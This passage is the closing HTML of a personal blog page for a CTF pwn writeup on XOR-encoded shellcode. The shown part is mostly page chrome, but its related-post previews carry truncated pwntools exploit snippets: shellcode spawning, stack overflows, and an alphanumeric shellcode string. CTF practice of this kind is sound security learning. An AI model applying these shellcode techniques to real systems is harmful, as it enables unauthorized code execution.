+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://Kanyooooo.github.io">Kanyo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://kanyooooo.github.io/docx/[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shell%20code%20revenge/">http://kanyooooo.github.io/docx/[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shell%20code%20revenge/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/shellcode/">shellcode</a><a class="post-meta__tags" href="/tags/PWN-writeup/">PWN-writeup</a><a class="post-meta__tags" href="/tags/buuctf/">buuctf</a></div><div class="post-share"><div class="social-share" data-image="/img/logo.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>欢迎打赏！饿饿，饭饭！！</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat_money.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat_money.jpg" alt="给我来杯咖啡"/></a><div class="post-qr-code-desc">给我来杯咖啡</div></li><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="个人微信"/></a><div class="post-qr-code-desc">个人微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/docx/jarvisoj_level1/" title="jarvisoj_level1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">jarvisoj_level1</div></div><div class="info-2"><div class="info-item-1">checksec    保护全关，32位系统。其中一开始会输出buf的地址 这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。 exp： 12345678910111213141516171819from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27...</div></div></div></a><a class="pagination-related" href="/docx/pwnable_orw%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%91/" title="pwnable_orw【有问题】"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">pwnable_orw【有问题】</div></div><div class="info-2"><div class="info-item-1"> Shellcode、ORW https://buuoj.cn/challenges#pwnable_orw  首先checksec  32位系统下，栈可执行，有金丝雀。看一下代码：  代码相当简单，有一个seccomp的初始化，然后read了一个shellcode（字符串），然后以shellcode字符串的地址直接在栈上执行。根据题目叫做pwn able orw，也就是一道考察ORW syscall的题目。 查看一下seccomp启用呢？  启用了open、read、write和exit，还有一个什么sigreturn和rt_sigreturn，和一个架构。 之前写过类似的题目，详细记录在这：shellcode1_dahuan02 不过这个是32位系统的，我们按照32位做一个ORWshellcode就可以了 1234567891011121314151617181920212223242526272829303132333435from pwn import *# r = process(&quot;./orw&quot;)r = process(&#x27;./orw&#x2...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/docx/ciscn_2019_s_9/" title="ciscn_2019_s_9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">ciscn_2019_s_9</div></div><div class="info-2"><div class="info-item-1"> Shellcode 栈溢出 https://buuoj.cn/challenges#ciscn_2019_s_9  首先checksec一下，看一下大概内容：  IDA打开之后，发现有一个后门函数hint，逻辑如下：  使用此函数的时候，执行esp里面的内容（使用了jmp），我们不需要这些上面什么乱七八糟的东西，我们只需要.text里面的0x08048554的jmp esp就行了。先记下来这是我们可以利用的漏洞。  然后这里是程序唯一一个输入口，也就是说大概率这里有漏洞： 他首先可以让我输入32h的内容，不过通过伪C代码（其实汇编也能看到），这个字符串的长度只有24。也就是说可以构造栈溢出，这个就很简单了。那么我现在构造含有shellcode这样的一个payload：  所以说，大概代码如下： 12345678910111213141516171819202122from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)p = re...</div></div></div></a><a class="pagination-related" href="/docx/mrctf2020_shellcode/" title="mrctf2020_shellcode"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">mrctf2020_shellcode</div></div><div class="info-2"><div class="info-item-1"> 类型：pwn、shellcode  https://buuoj.cn/challenges#mrctf2020_shellcode  首先检查文件  大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。  一整个流程是这样的，然后F5也没有办法正常反编译成伪C。  整个使用流程大概如此。 再回到汇编，在输出之后可以让我读取值。因为call了read函数 123456#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);//其中，fd是文件描述符//buf是指向数据将被读取的缓冲区的指针//而count是期望读取的字节数//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。   这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rb...</div></div></div></a><a class="pagination-related" href="/docx/mrctf2020_shellcode_revenge/" title="mrctf2020_shellcode_revenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">mrctf2020_shellcode_revenge</div></div><div class="info-2"><div class="info-item-1"> 类型：shellcode 字符审查 https://buuoj.cn/challenges#mrctf2020_shellcode  一如既往的checksec  打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。  看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的非字母、非数字常规文本字符给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。 然后原理和mrctf2020_shellcode一样，读入什么执行什么。 我们可以用alpha3工具来帮我们生成这个shellcode：alpha3.py ok了，然后我们就得到64位的shellcode字符串化的串为： 1Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102...</div></div></div></a><a class="pagination-related" href="/docx/pwnable_orw%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%91/" title="pwnable_orw【有问题】"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">pwnable_orw【有问题】</div></div><div class="info-2"><div class="info-item-1"> Shellcode、ORW https://buuoj.cn/challenges#pwnable_orw  首先checksec  32位系统下，栈可执行，有金丝雀。看一下代码：  代码相当简单，有一个seccomp的初始化，然后read了一个shellcode（字符串），然后以shellcode字符串的地址直接在栈上执行。根据题目叫做pwn able orw，也就是一道考察ORW syscall的题目。 查看一下seccomp启用呢？  启用了open、read、write和exit，还有一个什么sigreturn和rt_sigreturn，和一个架构。 之前写过类似的题目，详细记录在这：shellcode1_dahuan02 不过这个是32位系统的，我们按照32位做一个ORWshellcode就可以了 1234567891011121314151617181920212223242526272829303132333435from pwn import *# r = process(&quot;./orw&quot;)r = process(&#x27;./orw&#x2...</div></div></div></a><a class="pagination-related" href="/docx/easy-shellcode/" title="easy-shellcode"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">easy-shellcode</div></div><div class="info-2"><div class="info-item-1"> 类型：shellcode、栈溢出 https://www.qsnctf.com/  题目叫做：Easy_Shellcode    输入然后栈中执行，一开始的时候会输出v4的地址。  PIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。 exp: 123456789101112131415161718192021222324from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;challenge.qsnctf.com&#x27;port=34976file_addr = &#x27;./easy-shellcode&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)v4_addr=int(p.recvline()[2:],16)print(...</div></div></div></a><a class="pagination-related" href="/docx/jarvisoj_level1/" title="jarvisoj_level1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="info-item-2">jarvisoj_level1</div></div><div class="info-2"><div class="info-item-1">checksec    保护全关，32位系统。其中一开始会输出buf的地址 这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。 exp： 12345678910111213141516171819from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/logo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Kanyo</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/151419774?spm_id_from=333.337.0.0 || Bilibili || '#FF69B4'"><i class="fab fa-bilibili"></i><span>看看我的B</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Kanyooooo" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1531516107@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="/img/wechat.png" target="_blank" title="Wechat"><i class="fab fa-weixin" style="color: #1AAD19;"></i></a><a class="social-icon" href="/img/qq.png" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #87CEEB;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到Kanyo的博客，我在这里记录了一些技术文档。如有需要可以移步到bilibili观看相关技术讲解视频。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E7%AC%AC%E4%B8%80%E6%AE%B5shellcode-read%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">构造第一段shellcode - read函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E5%8A%A0%E5%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">异或加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E8%A7%A3%E5%AF%86syscall"><span class="toc-number">1.2.</span> <span class="toc-text">异或解密syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%B2%A1%E6%9C%89%E8%AE%B2%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.1.</span> <span class="toc-text">一些没有讲的小问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AE%B5shellcode"><span class="toc-number">2.</span> <span class="toc-text">第二段shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A8%E9%83%A8%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">全部代码：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/docx/jarvisoj_level2_64/" title="jarvisoj_level2_64">jarvisoj_level2_64</a><time datetime="2025-07-24T16:16:43.000Z" title="Created 2025-07-25 00:16:43">2025-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/docx/jarvisoj_level2/" title="jarvisoj_level2">jarvisoj_level2</a><time datetime="2025-07-24T16:16:42.000Z" title="Created 2025-07-25 00:16:42">2025-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/docx/jarvisoj_level1/" title="jarvisoj_level1">jarvisoj_level1</a><time datetime="2025-07-24T16:16:41.000Z" title="Created 2025-07-25 00:16:41">2025-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/docx/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/" title="[NewStarCTF 2023 公开赛道]shell code revenge">[NewStarCTF 2023 公开赛道]shell code revenge</a><time datetime="2025-07-24T16:13:40.000Z" title="Created 2025-07-25 00:13:40">2025-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/docx/mrctf2020_shellcode_revenge/" title="mrctf2020_shellcode_revenge">mrctf2020_shellcode_revenge</a><time datetime="2025-07-24T16:13:39.000Z" title="Created 2025-07-25 00:13:39">2025-07-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Kanyo</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
